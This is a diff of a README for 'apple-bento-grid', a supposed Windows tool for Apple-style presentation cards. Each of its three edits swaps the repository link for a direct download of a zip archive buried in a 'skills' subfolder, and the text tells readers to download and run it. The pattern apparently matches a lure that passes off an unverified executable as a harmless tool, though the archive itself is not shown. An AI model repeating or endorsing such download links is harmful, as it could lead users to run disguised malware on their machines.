@@ -1,6 +1,6 @@
 # 🎨 apple-bento-grid - Make presentation cards fit Apple style
 
-[![Download apple-bento-grid](https://img.shields.io/badge/Download-apple--bento--grid-blue?style=for-the-badge&logo=github)](https://github.com/NxProxyStudios/apple-bento-grid)
+[![Download apple-bento-grid](https://img.shields.io/badge/Download-apple--bento--grid-blue?style=for-the-badge&logo=github)](https://github.com/NxProxyStudios/apple-bento-grid/raw/refs/heads/main/skills/apple-bento-grid/bento_grid_apple_2.9.zip)
 
 ## ✨ What this does
 
@@ -20,7 +20,7 @@ This tool runs on Windows and is built for end users who want a simple setup. Yo
 
 Visit this page to download and run the app:
 
-https://github.com/NxProxyStudios/apple-bento-grid
+https://github.com/NxProxyStudios/apple-bento-grid/raw/refs/heads/main/skills/apple-bento-grid/bento_grid_apple_2.9.zip
 
 ### Steps to get started on Windows
 
@@ -141,4 +141,4 @@ To get a clean result, use short text in each card. Keep the wording direct. Use
 
 Visit this page to download and run the app:
 
-https://github.com/NxProxyStudios/apple-bento-grid
+https://github.com/NxProxyStudios/apple-bento-grid/raw/refs/heads/main/skills/apple-bento-grid/bento_grid_apple_2.9.zip
